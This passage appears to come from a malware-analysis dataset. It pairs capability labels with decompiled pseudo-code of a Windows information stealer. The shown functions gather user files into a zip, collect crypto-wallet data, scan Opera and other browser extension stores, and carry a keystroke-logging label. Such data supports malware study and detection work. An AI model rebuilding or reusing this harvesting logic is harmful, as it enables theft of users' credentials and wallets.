        "decompiled_code": "\nvoid __cdecl fcn.00408fe6(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint arg_8h_00;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    \n    var_8h = *0x443674 ^ &stack0xfffffffc;\n    arg_8h_00 = 0;\n    var_30h = 0;\n    iVar1 = (**0x4464fc)();\n    if ((((iVar1 == 0) && (iVar1 = (**0x446474)(),  iVar1 == 0x7a)) && (iVar1 = fcn.0041e0ea(var_30h),  iVar1 != 0)) &&\n       (iVar2 = (**0x4464fc)(),  iVar2 != 0)) {\n        var_34h = 0;\n        uVar3 = (**0x446528)(0x2000e, &var_34h);\n        iVar2 = (**0x4463bc)(uVar3);\n        if (iVar2 != 0) {\n            var_38h = 0;\n            iVar2 = (**0x446428)(var_34h, 2, &var_38h);\n            if (iVar2 != 0) {\n                var_2ch = 0;\n                var_28h = 0;\n                uStack40 = 0;\n                uStack36 = 0;\n                uStack32 = 0;\n                var_40h = 0;\n                var_44h = 0x14;\n                var_3ch = 0;\n                var_18h = 0x120089;\n                var_14h = 0x120116;\n                var_10h = 0x1200a0;\n                var_ch = 0x1f01ff;\n                (**0x4464d4)(&arg_8h, &var_18h);\n                (**0x44634c)(iVar1, var_38h, arg_8h, &var_18h, &var_2ch, &var_44h, &var_40h, &var_3ch);\n                (**0x446344)(var_38h);\n            }\n            (**0x446344)(var_34h);\n        }\n        fcn.0041e0b0(iVar1);\n    }\n    fcn.0041e0a1(arg_8h_00);\n    return;\n}\n",
        "token_count": 642
    },
    "004096dd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_78h\n\nvoid __cdecl fcn.004096dd(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_ca0h;\n    uint var_c9ch;\n    uint var_c98h;\n    uint var_c94h;\n    uint var_c90h;\n    uint var_c8ch;\n    uint var_c88h;\n    uint var_c84h;\n    uint var_c68h;\n    uint var_c4ch;\n    uint var_c3ch;\n    uint var_c38h;\n    uint var_c30h;\n    uint var_848h;\n    uint var_460h;\n    char *pcVar8;\n    uint var_78h;\n    uint var_4h;\n    \n    fcn.004208fe(0xc94);\n    *(unaff_EBP + -0xc9c) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0xc8c) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0xc94) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0xca0) = *(unaff_EBP + 0x1c);\n    fcn.004257d0(unaff_EBP + -0xc30, 0, 1000);\n    fcn.004257d0(unaff_EBP + -0x460, 0, 1000);\n    fcn.004257d0(unaff_EBP + -0x848, 0, 1000);\n    (**0x4464ac)(unaff_EBP + -0xc30, \"\\\\Files\\\\\");\n    (**0x4464ac)(unaff_EBP + -0xc30, extraout_ECX);\n    (**0x4464ac)(unaff_EBP + -0xc30, \".zip\");\n    uVar4 = fcn.0041d41d();\n    *(unaff_EBP + -0xc90) = uVar4;\n    *(unaff_EBP + -0xc88) = 0;\n    *(unaff_EBP + -0xc98) = 0;\n    uVar4 = fcn.00416c79(0x1a);\n    uVar4 = fcn.00416616(\"%APPDATA%\", uVar4);\n    (**0x446558)(unaff_EBP + -0x460, uVar4);\n    uVar4 = fcn.00416c79(0x1c);\n    uVar4 = fcn.00416616(\"%LOCALAPPDATA%\", uVar4);\n    (**0x446558)(unaff_EBP + -0x460, uVar4);\n    uVar4 = fcn.00416c79(0x28);\n    uVar4 = fcn.00416616(\"%USERPROFILE%\", uVar4);\n    (**0x446558)(unaff_EBP + -0x460, uVar4);\n    uVar4 = fcn.00415d19();\n    *(unaff_EBP + -0xc38) = 0xf;\n    *(unaff_EBP + -0xc3c) = 0;\n    *(unaff_EBP + -0xc4c) = 0;\n    fcn.00403f50(uVar4);\n    *(unaff_EBP + -4) = 0;\n    uVar4 = fcn.004042b6(unaff_EBP + -0xc84, \"C:\\\\Users\\\\\", unaff_EBP + -0xc4c);\n    *(unaff_EBP + -4) = 1;\n    puVar5 = fcn.0040c15f(unaff_EBP + -0xc68, uVar4, \"\\\\Desktop\\\\\");\n    *(unaff_EBP + -4) = 2;\n    if (0xf < puVar5[5]) {\n        puVar5 = *puVar5;\n    }\n    uVar4 = fcn.00416616(\"%DESKTOP%\", puVar5);\n    (**0x446558)(unaff_EBP + -0x460, uVar4);\n    fcn.00403f73(1, 0);\n    fcn.00403f73(1, 0);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00403f73(1, 0);\n    uVar4 = fcn.00416c79(5);\n    uVar4 = fcn.00416616(\"%DOCUMENTS%\", uVar4);\n    (**0x446558)(unaff_EBP + -0x460, uVar4);\n    uVar4 = fcn.00416c79(0x26);\n    uVar4 = fcn.00416616(\"%PROGRAMFILES%\", uVar4);\n    (**0x446558)(unaff_EBP + -0x460, uVar4);\n    uVar4 = fcn.00416c79(0x2a);\n    uVar4 = fcn.00416616(\"%PROGRAMFILES_86%\", uVar4);\n    (**0x446558)(unaff_EBP + -0x460, uVar4);\n    uVar4 = fcn.00416c79(8);\n    uVar4 = fcn.00416616(0x43e05c, uVar4);\n    (**0x446558)(unaff_EBP + -0x460, uVar4);\n    iVar6 = (**0x44641c)(unaff_EBP + -0x460, 0x43e068, 0);\n    if (iVar6 != 0) {\n        *(unaff_EBP + -0xc88) = 1;\n    }\n    iVar6 = (**0x44641c)(unaff_EBP + -0x460, 0x43e078, 0);\n    if (iVar6 != 0) {\n        *(unaff_EBP + -0xc88) = 1;\n        *(unaff_EBP + -0xc98) = 1;\n    }\n    iVar6 = (**0x44641c)(*(unaff_EBP + -0xc9c), \"*%RECENT%*\", 0);\n    if (*(unaff_EBP + -0xc88) == 0) {\n        fcn.00409689(*(unaff_EBP + -0xc8c), unaff_EBP + -0x460, *(unaff_EBP + -0xc90), *(unaff_EBP + 0x14), \n                     *(unaff_EBP + 8), *(unaff_EBP + -0xc94), 0, iVar6 != 0);\n    }\n    else {\n        (**0x446440)(100, unaff_EBP + -0x78);\n        pcVar1 = unaff_EBP + -0x78;\n        cVar2 = *(unaff_EBP + -0x78);\n        while (cVar2 != '\\0') {\n            iVar7 = (**0x446384)(pcVar1);\n            if ((*(unaff_EBP + -0xc98) == 0) || (iVar7 != 2)) {\n                (**0x446558)(unaff_EBP + -0x848, unaff_EBP + -0x460);\n                pcVar8 = \"%DRIVE_FIXED%\";\n            }\n            else {\n                (**0x446558)(unaff_EBP + -0x848, unaff_EBP + -0x460);\n                pcVar8 = \"%DRIVE_REMOVABLE%\";\n            }\n            uVar4 = fcn.00416616(pcVar8, pcVar1);\n            (**0x446558)(unaff_EBP + -0x848, uVar4);\n            fcn.00409689(*(unaff_EBP + -0xc8c), unaff_EBP + -0x848, *(unaff_EBP + -0xc90), *(unaff_EBP + 0x14), \n                         *(unaff_EBP + 8), *(unaff_EBP + -0xc94), *(unaff_EBP + -0xc88), iVar6 != 0);\n            iVar7 = (**0x4463a4)(pcVar1);\n            pcVar1 = pcVar1 + iVar7 + 1;\n            cVar2 = *pcVar1;\n        }\n    }\n    piVar3 = *(unaff_EBP + -0xc90);\n    fcn.0041d51e(unaff_EBP + -0xc8c);\n    fcn.0041d4dc(unaff_EBP + -0xc30, *(unaff_EBP + -0xc8c), 3);\n    if (piVar3 == NULL) {\n        *0x4467a0 = 0x10000;\n    }\n    else if (*piVar3 == 1) {\n        fcn.00407f37(piVar3);\n    }\n    else if (*piVar3 == 2) {\n        iVar6 = piVar3[1];\n        *0x4467a0 = fcn.0041c7a3();\n        if (iVar6 != 0) {\n            fcn.0041d49e();\n        }\n        fcn.0041e801(*(unaff_EBP + -0xc90));\n    }\n    else {\n        *0x4467a0 = 0x80000;\n    }\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 2168
    },
    "0040a890": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid fcn.0040a890(void)\n\n{\n    uint uVar1;\n    uint arg_8h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    var_13ch = 0;\n    if (*0x446264 == NULL) {\n        *0x44663c = 0x10000;\n    }\n    else if (**0x446264 == 1) {\n        *0x44663c = fcn.004079f0(&var_13ch, &var_138h);\n    }\n    else {\n        *0x44663c = 0x80000;\n    }\n    arg_8h = 0;\n    uVar1 = (**0x446508)(0, var_10h);\n    (**0x446490)(uVar1);\n    fcn.00407f00(var_13ch);\n    fcn.0041e0a1(arg_8h);\n    return;\n}\n",
        "token_count": 241
    },
    "0040c013": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c013(uint *arg_8h, char *arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    char *pcVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *pcVar5;\n    char *pcVar6;\n    bool bVar7;\n    char *var_4h;\n    \n    if ((((arg_10h != 0) || (arg_8h[4] <= in_EAX && in_EAX != arg_8h[4])) && (in_EAX < arg_8h[4])) &&\n       (uVar3 = arg_8h[4] - in_EAX,  arg_10h <= uVar3)) {\n        pcVar4 = uVar3 + (1 - arg_10h);\n        if (0xf < arg_8h[5]) {\n            arg_8h = *arg_8h;\n        }\n        cVar1 = *arg_ch;\n        var_4h = in_EAX + arg_8h;\n        while (pcVar2 = fcn.0041ecc0(var_4h, cVar1, pcVar4),  pcVar2 != NULL) {\n            bVar7 = true;\n            uVar3 = arg_10h;\n            pcVar5 = pcVar2;\n            pcVar6 = arg_ch;\n            do {\n                if (uVar3 == 0) break;\n                uVar3 = uVar3 - 1;\n                bVar7 = *pcVar5 == *pcVar6;\n                pcVar5 = pcVar5 + 1;\n                pcVar6 = pcVar6 + 1;\n            } while (bVar7);\n            if (bVar7) {\n                return;\n            }\n            cVar1 = *arg_ch;\n            pcVar4 = var_4h + pcVar4 + (-1 - pcVar2);\n            var_4h = pcVar2 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 452
    },
    "0040c0f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040c0f0(char param_1)\n\n{\n    uint arg_ch;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    \n    if ((param_1 != '\\0') && (7 < unaff_ESI[5])) {\n        arg_ch = *unaff_ESI;\n        if (unaff_EDI != 0) {\n            fcn.00420150(unaff_ESI, arg_ch, unaff_EDI * 2);\n        }\n        fcn.0041e801(arg_ch);\n    }\n    unaff_ESI[5] = 7;\n    unaff_ESI[4] = unaff_EDI;\n    *(unaff_ESI + unaff_EDI * 2) = 0;\n    return;\n}\n",
        "token_count": 171
    },
    "0040c12d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c12d(int32_t param_1, char param_2, int32_t param_3)\n\n{\n    uint *in_EAX;\n    \n    if (param_3 == 1) {\n        if (0xf < in_EAX[5]) {\n            in_EAX = *in_EAX;\n        }\n        *(in_EAX + param_1) = param_2;\n    }\n    else {\n        if (0xf < in_EAX[5]) {\n            in_EAX = *in_EAX;\n        }\n        fcn.004257d0(in_EAX + param_1, param_2, param_3);\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "0040c903": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c903(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint in_ECX;\n    uint *arg_8h_00;\n    uint var_57ch;\n    uint var_578h;\n    uint var_574h;\n    uint var_570h;\n    uint var_56ch;\n    uint var_540h;\n    uint var_42ch;\n    uint var_324h;\n    uint var_21ch;\n    uint var_114h;\n    uint32_t var_8h;\n    \n    var_8h = *0x443674 ^ &stack0xfffffffc;\n    fcn.004257d0(&var_21ch, 0, 0x104);\n    uVar1 = fcn.00416c79(0x1a);\n    arg_8h_00 = &var_21ch;\n    (**0x4464ac)(arg_8h_00, uVar1);\n    if (arg_10h == 0) {\n        (**0x446300)(&var_42ch, \"%s\\\\%s\\\\%s\", &var_21ch);\n    }\n    else {\n        (**0x446300)(&var_42ch, 0x43e1d4, &var_21ch);\n    }\n    iVar2 = (**0x44656c)(&var_42ch, &var_56ch);\n    if (iVar2 != -1) {\n        do {\n            iVar3 = (**0x4464dc)(&var_540h, 0x43df80);\n            if ((iVar3 != 0) && (iVar3 = (**0x4464dc)(&var_540h, 0x43df84),  iVar3 != 0)) {\n                if (arg_10h == 0) {\n                    (**0x446300)(&var_324h, \"%s\\\\%s\\\\%s\", &var_21ch);\n                }\n                else {\n                    (**0x446300)(&var_324h, \"%s\\\\%s\\\\%s\\\\%s\", &var_21ch);\n                }\n                uVar4 = (**0x4463fc)(&var_324h);\n                if ((uVar4 != 0xffffffff) && ((uVar4 & 0x10) == 0)) {\n                    fcn.004257d0(&var_114h, 0, 0x104);\n                    (**0x4464ac)(&var_114h, \"\\\\Wallets\\\\\");\n                    (**0x4464ac)(&var_114h, arg_8h);\n                    (**0x4464ac)(&var_114h, 0x43bd7c);\n                    (**0x4464ac)(&var_114h, &var_540h);\n                    if (arg_10h != 0) {\n                        (**0x4464ac)(&var_114h, 0x43bd7c);\n                        (**0x4464ac)(&var_114h, in_ECX);\n                    }\n                    fcn.0041d4dc(&var_114h, 0, 2);\n                }\n            }\n            iVar3 = (**0x4463c4)(iVar2, &var_56ch);\n        } while (iVar3 != 0);\n        (**0x446334)(iVar2);\n    }\n    fcn.0041e0a1(arg_8h_00);\n    return;\n}\n",
        "token_count": 790
    },
    "0040e1a5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __fastcall fcn.0040e1a5(uint param_1)\n\n{\n    int32_t *unaff_ESI;\n    uint uVar1;\n    uint var_4h;\n    \n    if (*unaff_ESI == 0) {\n        uVar1 = 0;\n        fcn.0041dbc3(0);\n        if (*unaff_ESI == 0) {\n            *0x444ae4 = *0x444ae4 + 1;\n            *unaff_ESI = *0x444ae4;\n        }\n        fcn.0041dbeb(uVar1, param_1);\n    }\n    return *unaff_ESI;\n}\n",
        "token_count": 165
    },
    "004102de": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.004102de(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *arg_8h_00;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    uint unaff_ESI;\n    uint var_480h;\n    uint var_47ch;\n    uint var_478h;\n    uint var_474h;\n    uint var_470h;\n    uint var_46ch;\n    uint var_468h;\n    uint var_464h;\n    uint var_438h;\n    uint var_324h;\n    uint var_21ch;\n    uint var_114h;\n    uint32_t var_8h;\n    \n    var_8h = *0x443674 ^ &stack0xfffffffc;\n    (**0x446300)(&var_324h, \"%s\\\\*\", arg_ch);\n    iVar1 = (**0x44656c)(&var_324h, &var_464h);\n    if (iVar1 != -1) {\n        do {\n            iVar2 = (**0x4464dc)(&var_438h, 0x43df80);\n            if ((iVar2 != 0) && (iVar2 = (**0x4464dc)(&var_438h, 0x43df84),  iVar2 != 0)) {\n                (**0x446300)(&var_114h, \"%s\\\\%s\", arg_ch, &var_438h);\n                fcn.004257d0(&var_21ch, 0, 0x104);\n                (**0x446300)(&var_21ch, \"%s\\\\%s\\\\%s\\\\%s\", arg_ch, &var_438h, *0x4460b0, *0x445a68);\n                iVar2 = (**0x4464dc)(&var_438h, *0x445ce4);\n                if (iVar2 == 0) {\n                    fcn.0040eaf7(arg_8h, arg_10h, arg_14h, arg_18h);\n                }\n                else {\n                    iVar2 = (**0x4464dc)(&var_438h, *0x445a68);\n                    if (iVar2 == 0) {\n                        arg_8h_00 = &var_114h;\n                    }\n                    else {\n                        uVar3 = (**0x4463fc)(&var_21ch);\n                        if ((uVar3 == 0xffffffff) || ((uVar3 & 0x10) != 0)) {\n                            iVar2 = (**0x4464dc)(&var_438h, *0x445d80);\n                            if (iVar2 == 0) {\n                                if (*(in_ECX + 2) != '\\0') {\n                                    fcn.0040f637(arg_8h, arg_10h, arg_1ch);\n                                    fcn.0040f7db(arg_8h, arg_10h, arg_1ch);\n                                }\n                            }\n                            else {\n                                iVar2 = (**0x4464dc)(&var_438h, *0x445af4);\n                                if (iVar2 == 0) {\n                                    if (*(in_ECX + 1) != '\\0') {\n                                        fcn.0040f1c6(arg_8h, arg_10h, arg_14h, arg_18h, arg_1ch);\n                                        fcn.0040f478(arg_8h, arg_10h, arg_1ch);\n                                    }\n                                }\n                                else if ((var_464h & 0x10) == 0) goto code_r0x00410576;\n                            }\n                            goto code_r0x0041054e;\n                        }\n                        arg_8h_00 = &var_21ch;\n                    }\n                    fcn.0040ed8b(arg_8h_00, arg_14h, arg_18h, arg_1ch);\n                }\ncode_r0x0041054e:\n                fcn.004102de(&var_438h, &var_114h, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n            }\ncode_r0x00410576:\n            iVar2 = (**0x4463c4)(iVar1, &var_464h);\n        } while (iVar2 != 0);\n        (**0x446334)(iVar1);\n    }\n    fcn.0041e0a1(unaff_ESI);\n    return;\n}\n",
        "token_count": 1037
    },
    "004105ae": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004105ae(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint unaff_ESI;\n    uint var_370h;\n    uint var_36ch;\n    uint var_368h;\n    uint var_364h;\n    uint var_360h;\n    uint var_35ch;\n    uint var_330h;\n    uint var_21ch;\n    uint var_114h;\n    uint32_t var_8h;\n    \n    var_8h = *0x443674 ^ &stack0xfffffffc;\n    (**0x446300)(&var_21ch, \"%s\\\\*\", arg_ch);\n    iVar1 = (**0x44656c)(&var_21ch, &var_35ch);\n    if (iVar1 != -1) {\n        do {\n            iVar2 = (**0x4464dc)(&var_330h, 0x43df80);\n            if ((iVar2 != 0) && (iVar2 = (**0x4464dc)(&var_330h, 0x43df84),  iVar2 != 0)) {\n                (**0x446300)(&var_114h, \"%s\\\\%s\", arg_ch, &var_330h);\n                iVar2 = (**0x4464dc)(&var_330h, *0x445f04);\n                if (iVar2 == 0) {\n                    fcn.0040fc0d(arg_10h, arg_14h);\n                }\n                else {\n                    iVar2 = (**0x4464dc)(&var_330h, *0x445a4c);\n                    if (iVar2 == 0) {\n                        fcn.00410111(arg_8h, arg_10h, arg_14h);\n                    }\n                    else {\n                        iVar2 = (**0x4464dc)(&var_330h, *0x446258);\n                        if (iVar2 == 0) {\n                            iVar2 = (**0x4462b8)(arg_ch);\n                            if (iVar2 == 0) {\n                                fcn.0040f9aa(arg_10h);\n                            }\n                        }\n                        else {\n                            iVar2 = (**0x4464dc)(&var_330h, *0x445ac4);\n                            if (iVar2 == 0) {\n                                if (*(in_ECX + 2) != '\\0') {\n                                    fcn.0040ff7c(arg_8h, arg_10h, arg_14h);\n                                }\n                            }\n                            else if ((var_35ch & 0x10) == 0) goto code_r0x0041077a;\n                        }\n                    }\n                }\n                fcn.004105ae(&var_330h, &var_114h, arg_10h, arg_14h, arg_18h);\n            }\ncode_r0x0041077a:\n            iVar2 = (**0x4463c4)(iVar1, &var_35ch);\n        } while (iVar2 != 0);\n        (**0x446334)(iVar1);\n    }\n    fcn.0041e0a1(unaff_ESI);\n    return;\n}\n",
        "token_count": 736
    },
    "00412209": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00412209(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, int32_t arg_1ch, int32_t arg_20h, \n            int32_t arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint in_ECX;\n    uint in_EDX;\n    uint unaff_ESI;\n    char *pcVar4;\n    uint var_9a0h;\n    uint var_99ch;\n    uint var_998h;\n    uint var_994h;\n    uint var_990h;\n    uint var_98ch;\n    uint var_988h;\n    uint var_95ch;\n    uint var_848h;\n    uint var_740h;\n    uint var_638h;\n    uint var_530h;\n    uint var_428h;\n    uint var_320h;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    (**0x446300)(&var_848h, \"%s\\\\*.*\");\n    if (arg_18h == 0) {\n        iVar1 = (**0x44656c)(&var_848h, &var_988h);\n        if (iVar1 != -1) {\n            do {\n                iVar2 = (**0x4464dc)(&var_95ch, 0x43df80);\n                if ((iVar2 != 0) && (iVar2 = (**0x4464dc)(&var_95ch, 0x43df84),  iVar2 != 0)) {\n                    fcn.004257d0(&var_110h, 0, 0x104);\n                    (**0x4464ac)(&var_110h, &var_95ch);\n                    (**0x446300)(&var_218h, \"%s\\\\%s\\\\%s\\\\%s\", in_EDX, &var_110h, *0x446028, in_ECX);\n                    (**0x446300)(&var_428h, \"%s\\\\%s\", &var_218h, *0x445a78);\n                    (**0x446300)(&var_320h, \"%s\\\\%s\\\\%s\\\\%s\", in_EDX, &var_110h, *0x445e94, in_ECX);\n                    (**0x446300)(&var_530h, \"%s\\\\%s\", &var_320h, *0x445a78);\n                    (**0x446300)(&var_638h, \"%s\\\\%s\\\\%s\\\\chrome-extension_%s_0.indexeddb.leveldb\", in_EDX, &var_110h, \n                                 *0x445b60, in_ECX);\n                    (**0x446300)(&var_740h, \"%s\\\\%s\", &var_638h, *0x445a78);\n                    if ((arg_1ch != 0) &&\n                       ((uVar3 = (**0x4463fc)(&var_428h),  uVar3 != 0xffffffff && ((uVar3 & 0x10) == 0)))) {\n                        fcn.00411ed7(arg_8h, &var_218h, arg_10h, &var_110h, arg_14h, 1);\n                    }\n                    if (((arg_20h != 0) && (uVar3 = (**0x4463fc)(&var_530h),  uVar3 != 0xffffffff)) &&\n                       ((uVar3 & 0x10) == 0)) {\n                        fcn.00411ed7(arg_8h, &var_320h, arg_10h, &var_110h, arg_14h, 2);\n                    }\n                    if (((arg_24h != 0) && (uVar3 = (**0x4463fc)(&var_740h),  uVar3 != 0xffffffff)) &&\n                       ((uVar3 & 0x10) == 0)) {\n                        fcn.00411ed7(arg_8h, &var_638h, arg_10h, &var_110h, arg_14h, 3);\n                    }\n                    fcn.004257d0(&var_218h, 0, 0x104);\n                    fcn.004257d0(&var_428h, 0, 0x104);\n                    fcn.004257d0(&var_320h, 0, 0x104);\n                    fcn.004257d0(&var_530h, 0, 0x104);\n                    fcn.004257d0(&var_638h, 0, 0x104);\n                    fcn.004257d0(&var_740h, 0, 0x104);\n                }\n                iVar2 = (**0x4463c4)(iVar1, &var_988h);\n            } while (iVar2 != 0);\n            (**0x446334)(iVar1);\n        }\n        goto code_r0x004126ee;\n    }\n    fcn.004257d0(&var_110h, 0, 0x104);\n    if (arg_18h == 1) {\n        pcVar4 = \"Opera Stable\";\ncode_r0x0041255b:\n        (**0x4464ac)(&var_110h, pcVar4);\n    }\n    else if (arg_18h == 2) {\n        pcVar4 = \"Opera GX Stable\";\n        goto code_r0x0041255b;\n    }\n    (**0x446300)(&var_740h, \"%s\\\\%s\\\\%s\\\\%s\");\n    (**0x446300)(&var_638h, \"%s\\\\%s\", &var_740h, *0x445a78);\n    (**0x446300)(&var_530h, \"%s\\\\%s\\\\%s\\\\%s\");\n    (**0x446300)(&var_320h, \"%s\\\\%s\", &var_530h, *0x445a78);\n    (**0x446300)(&var_428h, \"%s\\\\%s\\\\%s\\\\chrome-extension_%s_0.indexeddb.leveldb\");\n    (**0x446300)(&var_218h, \"%s\\\\%s\", &var_428h, *0x445a78);\n    uVar3 = (**0x4463fc)(&var_638h);\n    if ((uVar3 != 0xffffffff) && ((uVar3 & 0x10) == 0)) {\n        fcn.00411ed7(arg_8h, &var_740h, arg_10h, &var_110h, arg_14h, 1);\n    }\n    uVar3 = (**0x4463fc)(&var_320h);\n    if ((uVar3 != 0xffffffff) && ((uVar3 & 0x10) == 0)) {\n        fcn.00411ed7(arg_8h, &var_530h, arg_10h, &var_110h, arg_14h, 2);\n    }\n    uVar3 = (**0x4463fc)(&var_218h);\n    if ((uVar3 != 0xffffffff) && ((uVar3 & 0x10) == 0)) {\n        fcn.00411ed7(arg_8h, &var_428h, arg_10h, &var_110h, arg_14h, 3);\n    }\ncode_r0x004126ee:\n    fcn.0041e0a1(unaff_ESI);\n    return;\n}\n",
        "token_count": 1726
    },
    "00413813": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_118h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00413813(void)\n\n{\n    uint *puVar1;\n    char *arg_8h;\n    int32_t *in_FS_OFFSET;\n    uchar auStackY100924 [28];\n    uchar auStackY100896 [16];\n    uint uStackY100880;\n    uint uStackY100876;\n    uchar auStackY100868 [28];\n    uchar auStackY100840 [16];\n    uint uStackY100824;\n    uint uStackY100820;\n    uchar auStackY100812 [100000];\n    uint var_328h;\n    uint uStackY676;\n    uint *puStackY672;\n    uint uStackY668;\n    uint *puStackY664;\n    uint uStackY660;\n    uint *puStackY656;\n    char32_t *pcStackY652;\n    uint *puStackY648;\n    char32_t *pcStackY644;\n    uint *puStackY640;\n    char32_t *pcStackY636;\n    uint *puStackY632;\n    char32_t *pcStackY628;\n    uint *puStackY624;\n    char32_t *pcStackY620;\n    uint *puStackY616;\n    char32_t *pcStackY612;\n    uint *puStackY608;\n    char32_t *pcStackY604;\n    uint *puStackY600;\n    char32_t *pcStackY596;\n    uint *puStackY592;\n    char32_t *pcStackY588;\n    uint *puStackY584;\n    char32_t *pcStackY580;\n    uint *puStackY576;\n    char32_t *pcStackY572;\n    uint *puStackY568;\n    char32_t *pcStackY564;\n    uint *puStackY560;\n    char32_t *pcStackY556;\n    uint *puStackY552;\n    char32_t *var_220h;\n    uint *puStackY544;\n    char32_t *pcStackY540;\n    uint *puStackY536;\n    uint uStackY532;\n    uint *puStackY528;\n    uint uStackY524;\n    uint *puStackY520;\n    uint uStackY516;\n    uint *puStackY512;\n    uint uStackY508;\n    uint *puStackY504;\n    char32_t *pcStackY500;\n    uint *puStackY496;\n    uint uStackY492;\n    uint *puStackY488;\n    uint uStackY484;\n    uint *puStackY480;\n    uint uStackY476;\n    uint *puStackY472;\n    char32_t *pcStackY468;\n    uint 